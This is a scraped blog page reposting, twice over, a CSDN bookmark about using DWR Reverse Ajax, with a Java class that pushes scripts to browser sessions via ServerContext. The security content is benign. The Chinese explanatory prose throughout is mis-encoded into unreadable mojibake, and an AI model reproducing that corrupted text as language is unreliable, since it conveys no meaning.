<li><a href="http://wz.csdn.net/my" target="_blank">ç®¡ç†ç½‘æ‘˜</a></li>
<li><a href="http://wz.csdn.net/spy" target="_blank">å®æ—¶ç½‘æ‘˜</a></li>
<li><a href="http://wz.csdn.net/tool" target="_blank">å·¥å…·å’Œå¸®åŠ©</a></li>
</ul>
<h1 id="dwr-reverse-ajax-">DWR Reverse AjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹</h1>
<p>Reverse Ajaxä¸»è¦æ˜¯åœ¨BSæ¶æ„ä¸­ï¼Œä»æœåŠ¡å™¨ç«¯å‘å¤šä¸ªæµè§ˆå™¨ä¸»åŠ¨æ¨æ•°æ®çš„ä¸€ç§æŠ€æœ¯ã€‚å®ƒçš„ä¸€ç§å®ç°å°±æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨è¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¸ç«‹å³å›åº”ï¼Œä»è€Œå¯¼è‡´ä¸€ä¸ªhttpé•¿è¿æ¥ï¼Œç­‰åˆ°æœ‰æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œå†åˆ©ç”¨è¿™ä¸ªè¿æ¥â€œä¸»åŠ¨â€å‘å®¢æˆ·ç«¯å›é€ã€‚
å¦‚æœæ˜¯åˆæ¬¡æ¥è§¦ï¼Œé‚£ä¸€å®šè¦çœ‹ä¸‹è¿™ç¯‡æ–‡ç« 
å…¶ä¸­ï¼Œè¯¦è¿°äº†è¿™ç§æŠ€æœ¯å’ŒJETTYæœåŠ¡å™¨ContinuationsåŠŸèƒ½ç»“åˆæ—¶çš„å¼ºå¤§æ€§èƒ½ï¼šè¿è¡Œåœ¨éé˜»å¡æ–¹å¼ä¸‹ï¼Œå½“å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚æ—¶ä¸ä¼šå ç”¨è¿‡å¤šçº¿ç¨‹ã€‚
æœ€åï¼Œæ­¤æ–‡ç”³æ˜DWRçš„å®ç°å·²ç»å¤©ç„¶ä½¿ç”¨äº†JETTYè¿™ä¸€åŠŸèƒ½ã€‚æ‰€ä»¥ä½¿ç”¨DWRè¿˜æ˜¯éå¸¸æœ‰å¥½å¤„çš„ã€‚å¦‚ä½•ä½¿ç”¨åŠç¤ºä¾‹ä¸Šé¢è¿™ç¯‡æ–‡ç« å·²ç»æœ‰è¯´æ˜ï¼Œä¸‹é¢å°±ä»¥æˆ‘å®é™…ä½¿ç”¨ä¸­ç¢°åˆ°çš„é—®é¢˜å’Œè¦ç‚¹åšä¸ªè¯´æ˜ã€‚
é¦–å…ˆï¼Œè¯´ä¸€ä¸‹ä»£ç çš„ç»„ç»‡å’Œå£°æ˜ã€‚
å°†ä½¿ç”¨åˆ°Reverse Ajaxçš„ä»£ç å½’å…¥ä¸€ä¸ªç±»ï¼Œæ¯”å¦‚æ˜¯NotifyClientï¼Œå¹¶ç”¨springçš„beanæ¥å£°æ˜ã€‚åœ¨å°†è¦ç”¨åˆ°è¿™ä¸ªç±»çš„åœ°æ–¹(NodeSvcImplç±»)ï¼Œä¹Ÿé€šè¿‡æˆå‘˜å˜é‡å¼•å…¥:
ç„¶ååœ¨dwr.xmlé‡Œè¿™æ ·å£°æ˜ï¼š
å…¶æ¬¡ä¸€ä¸ªè¦ç‚¹æ˜¯ï¼Œå¦‚æœä½ ä¸æ˜¯åœ¨DWRæ‰€å¼€çš„çº¿ç¨‹ä¸­ä½¿ç”¨Reverse Ajaxï¼Œé‚£WebContextFactory.get()ä¼šè¿”å›ç©ºï¼Œè¿™æ˜¯å› ä¸ºåªæœ‰DWRè‡ªå·±çš„çº¿ç¨‹æ‰ä¼šåˆå§‹åŒ–å®ƒã€‚é‚£å¦‚æœä½ æ˜¯åœ¨DWRä¹‹å¤–ä½¿ç”¨ï¼Œæ¯”å¦‚è¯´æ”¶åˆ°JMSæ¶ˆæ¯ï¼Œæˆ–è€…UDPæ¶ˆæ¯åï¼Œæƒ³é€šçŸ¥æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œä½ å°±è¦ç”¨åˆ°ServerContextã€‚
è¦å¾—åˆ°ServerContextï¼Œå°±éœ€è¦ç”¨åˆ°springçš„ServletContextAwareæ¥å£ï¼Œä¸‹é¢æ˜¯å®Œæ•´ä»£ç ï¼š
package com.hhh.nms.remote;
import org.apache.log4j.Logger;
import javax.servlet.ServletContext;
import org.springframework.web.context.ServletContextAware;
import java.util.Collection;
import org.directwebremoting.ScriptBuffer;
import org.directwebremoting.ScriptSession;
import org.directwebremoting.WebContext;
import org.directwebremoting.WebContextFactory;
import org.directwebremoting.ServerContext;
import org.directwebremoting.ServerContextFactory;
import org.directwebremoting.proxy.dwr.Util;
public class NotifyClient implements ServletContextAware {
static Logger logger = Logger.getLogger (NotifyClient.class.getName());
private ServletContext servletContext = null;
public void setServletContext( ServletContext servletContext )
{
this.servletContext = servletContext;
}
public int serviceUpdate (String str1, String str2) {
logger.info (&quot;entered&quot;);
logger.info (&quot;WebContext1&quot;+servletContext);
ServerContext ctx = ServerContextFactory.get(servletContext );
// Generate JavaScript code to call client-side
// WebContext ctx = WebContextFactory.get();
logger.info (&quot;WebContext&quot;+ctx);
if (ctx != null) {
//String currentPage = ctx.getCurrentPage();
//logger.info (&quot;current page:&quot; + currentPage);
ScriptBuffer script = new ScriptBuffer();
script.appendScript(&quot;updatePoint(&quot;)
.appendData(str1)
.appendScript(&quot;,&quot;)
.appendData (str2)
.appendScript(&quot;);&quot;);
// Push script out to clients viewing the page
Collection sessions =
ctx.getScriptSessionsByPage(&quot;/ebnms/index.eb?do=dwrtest&quot;);
logger.info (&quot;jsp session size:&quot; + sessions.size ());
// or
Collection sessions2 =
ctx.getAllScriptSessions ();
logger.info (&quot;all session size:&quot; + sessions2.size ());
for (ScriptSession session : sessions2) {
session.addScript(script);
}
}
return 0;
}
}
å¦å¤–ï¼ŒScriptBufferçš„appendScriptæ–¹æ³•æ˜¯æ’å…¥åŸå§‹å­—ä¸²ï¼ŒappendDataä¼šæ ¹æ®å‚æ•°ç±»å‹åšç›¸åº”è½¬æ¢ã€‚</p>
<p><a href="http://www.blogjava.net/alwayscy/archive/2007/11/01/157552.html" target="_blank"><a href="http://www.blogjava.net/alwayscy/archive/2007/11/01/157552.html">http://www.blogjava.net/alwayscy/archive/2007/11/01/157552.html</a></a></p>
<h1 id="-">ä»–ä»¬è®¾ç½®äº†å“ªäº›æ ‡ç­¾ï¼š</h1>
<p><a href="http://wz.csdn.net/tag/WEBÃ¥Â¼Â€Ã¥ÂÂ‘/" title="1ä¸ªç½‘æ‘˜" target="_blank">WEBå¼€å‘</a></p>
<h1 id="-">è°æ”¶è—äº†è¿™ä¸ªç½‘å€ï¼š</h1>
<h2 id="-conanpaul-http-wz-csdn-net-conanpaul-"><a href="http://wz.csdn.net/conanpaul/" target="_blank">conanpaul</a>æ”¶å½•</h2>
<p>ä½¿ç”¨æ ‡ç­¾ï¼š<a href="http://wz.csdn.net/conanpaul/Webå¼€å‘/" target="_blank">Webå¼€å‘</a>ï¼Œæ—¶é—´ï¼š2007-11-2 9:34:36 | <a href="http://wz.csdn.net/item/1204886/" target="_blank">ç›¸å…³ç½‘æ‘˜</a>
Reverse Ajaxä¸»è¦æ˜¯åœ¨BSæ¶æ„ä¸­ï¼Œä»æœåŠ¡å™¨ç«¯å‘å¤šä¸ªæµè§ˆå™¨ä¸»åŠ¨æ¨æ•°æ®çš„ä¸€ç§æŠ€æœ¯ã€‚å®ƒçš„ä¸€ç§å®ç°å°±æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨è¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¸ç«‹å³å›åº”ï¼Œä»è€Œå¯¼è‡´ä¸€ä¸ªhttpé•¿è¿æ¥ï¼Œç­‰åˆ°æœ‰æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œå†åˆ©ç”¨è¿™ä¸ªè¿æ¥â€œä¸»åŠ¨â€å‘å®¢æˆ·ç«¯å›é€ã€‚
å¦‚æœæ˜¯åˆæ¬¡æ¥è§¦ï¼Œé‚£ä¸€å®šè¦çœ‹ä¸‹è¿™ç¯‡æ–‡ç« 
å…¶ä¸­ï¼Œè¯¦è¿°äº†è¿™ç§æŠ€æœ¯å’ŒJETTYæœåŠ¡å™¨ContinuationsåŠŸèƒ½ç»“åˆæ—¶çš„å¼ºå¤§æ€§èƒ½ï¼šè¿è¡Œåœ¨éé˜»å¡æ–¹å¼ä¸‹ï¼Œå½“å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚æ—¶ä¸ä¼šå ç”¨è¿‡å¤šçº¿ç¨‹ã€‚
æœ€åï¼Œæ­¤æ–‡ç”³æ˜DWRçš„å®ç°å·²ç»å¤©ç„¶ä½¿ç”¨äº†JETTYè¿™ä¸€åŠŸèƒ½ã€‚æ‰€ä»¥ä½¿ç”¨DWRè¿˜æ˜¯éå¸¸æœ‰å¥½å¤„çš„ã€‚å¦‚ä½•ä½¿ç”¨åŠç¤ºä¾‹ä¸Šé¢è¿™ç¯‡æ–‡ç« å·²ç»æœ‰è¯´æ˜ï¼Œä¸‹é¢å°±ä»¥æˆ‘å®é™…ä½¿ç”¨ä¸­ç¢°åˆ°çš„é—®é¢˜å’Œè¦ç‚¹åšä¸ªè¯´æ˜ã€‚
é¦–å…ˆï¼Œè¯´ä¸€ä¸‹ä»£ç çš„ç»„ç»‡å’Œå£°æ˜ã€‚
å°†ä½¿ç”¨åˆ°Reverse Ajaxçš„ä»£ç å½’å…¥ä¸€ä¸ªç±»ï¼Œæ¯”å¦‚æ˜¯NotifyClientï¼Œå¹¶ç”¨springçš„beanæ¥å£°æ˜ã€‚åœ¨å°†è¦ç”¨åˆ°è¿™ä¸ªç±»çš„åœ°æ–¹(NodeSvcImplç±»)ï¼Œä¹Ÿé€šè¿‡æˆå‘˜å˜é‡å¼•å…¥:
ç„¶ååœ¨dwr.xmlé‡Œè¿™æ ·å£°æ˜ï¼š
å…¶æ¬¡ä¸€ä¸ªè¦ç‚¹æ˜¯ï¼Œå¦‚æœä½ ä¸æ˜¯åœ¨DWRæ‰€å¼€çš„çº¿ç¨‹ä¸­ä½¿ç”¨Reverse Ajaxï¼Œé‚£WebContextFactory.get()ä¼šè¿”å›ç©ºï¼Œè¿™æ˜¯å› ä¸ºåªæœ‰DWRè‡ªå·±çš„çº¿ç¨‹æ‰ä¼šåˆå§‹åŒ–å®ƒã€‚é‚£å¦‚æœä½ æ˜¯åœ¨DWRä¹‹å¤–ä½¿ç”¨ï¼Œæ¯”å¦‚è¯´æ”¶åˆ°JMSæ¶ˆæ¯ï¼Œæˆ–è€…UDPæ¶ˆæ¯åï¼Œæƒ³é€šçŸ¥æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œä½ å°±è¦ç”¨åˆ°ServerContextã€‚
è¦å¾—åˆ°ServerContextï¼Œå°±éœ€è¦ç”¨åˆ°springçš„ServletContextAwareæ¥å£ï¼Œä¸‹é¢æ˜¯å®Œæ•´ä»£ç ï¼š
package com.hhh.nms.remote;
import org.apache.log4j.Logger;
import javax.servlet.ServletContext;
import org.springframework.web.context.ServletContextAware;
import java.util.Collection;
import org.directwebremoting.ScriptBuffer;
import org.directwebremoting.ScriptSession;
import org.directwebremoting.WebContext;
import org.directwebremoting.WebContextFactory;
import org.directwebremoting.ServerContext;
import org.directwebremoting.ServerContextFactory;
import org.directwebremoting.proxy.dwr.Util;
public class NotifyClient implements ServletContextAware {
static Logger logger = Logger.getLogger (NotifyClient.class.getName());
private ServletContext servletContext = null;
public void setServletContext( ServletContext servletContext )
{
this.servletContext = servletContext;
}
public int serviceUpdate (String str1, String str2) {
logger.info (&quot;entered&quot;);
logger.info (&quot;WebContext1&quot;+servletContext);
ServerContext ctx = ServerContextFactory.get(servletContext );
// Generate JavaScript code to call client-side
// WebContext ctx = WebContextFactory.get();
logger.info (&quot;WebContext&quot;+ctx);
if (ctx != null) {
//String currentPage = ctx.getCurrentPage();
//logger.info (&quot;current page:&quot; + currentPage);
ScriptBuffer script = new ScriptBuffer();
script.appendScript(&quot;updatePoint(&quot;)
.appendData(str1)
.appendScript(&quot;,&quot;)
.appendData (str2)
.appendScript(&quot;);&quot;);
// Push script out to clients viewing the page
Collection sessions =
ctx.getScriptSessionsByPage(&quot;/ebnms/index.eb?do=dwrtest&quot;);
logger.info (&quot;jsp session size:&quot; + sessions.size ());
// or
Collection sessions2 =
ctx.getAllScriptSessions ();
logger.info (&quot;all session size:&quot; + sessions2.size ());
for (ScriptSession session : sessions2) {
session.addScript(script);
}
}
return 0;
}
}
å¦å¤–ï¼ŒScriptBufferçš„appendScriptæ–¹æ³•æ˜¯æ’å…¥åŸå§‹å­—ä¸²ï¼ŒappendDataä¼šæ ¹æ®å‚æ•°ç±»å‹åšç›¸åº”è½¬æ¢ã€‚
<a href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202001032100010"></a></p>
<p><a href="http://www.csdn.net/help/intro.htm" target="_blank">ç½‘ç«™ç®€ä»‹</a>ï¼<a href="http://www.csdn.net/help/ads.htm" target="_blank">å¹¿å‘ŠæœåŠ¡</a>ï¼<a href="http://www.csdn.net/help/sitemap.htm" target="_blank">ç½‘ç«™åœ°å›¾</a>ï¼<a href="http://www.csdn.net/help/help.htm" target="_blank">å¸®åŠ©</a>ï¼<a href="http://www.csdn.net/help/contact.htm" target="_blank">è”ç³»æ–¹å¼</a>ï¼<a href="http://job.csdn.net/Jobs/f9c75c9f2ad14404a604669b757b9ed0/viewcompany.aspx" target="_blank">è¯šè˜è‹±æ‰</a>ï¼<a href="http://www.csdn.net/english/" target="_blank">English</a>ï¼<a href="http://wz.csdn.net/url/708367/#" target="_blank">é—®é¢˜æŠ¥å‘Š</a>
åŒ—äº¬ç™¾è”ç¾è¾¾ç¾æ•°ç ç§‘æŠ€æœ‰é™å…¬å¸ ç‰ˆæƒæ‰€æœ‰ äº¬ ICP è¯ 020026 å·
Copyright Â© 2000-2009, CSDN.NET, All Rights Reserved
<a href="http://www.vdoing.com/" title="Vdoing StatsX No.56805" target="_blank"><img src="" alt=""></a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/dwr/">dwr</a></li></span></span> | <span class="tags">Tagged <a href="/tags/dwr/" class="label label-primary">dwr</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/93/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li><a class="page-number" href="/page/93/">93</a></li><li class="active"><li><span class="page-number current">94</span></li><li><a class="page-number" href="/page/95/">95</a></li><li><a class="page-number" href="/page/96/">96</a></li><li><a class="page-number" href="/page/97/">97</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/95/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">æœ€è¿‘æ›´æ–°</div>  <div data-src='latest_update_posts' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> æ›´æ–°æ—¶é—´: <em>2014-03-15 16:01:37</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
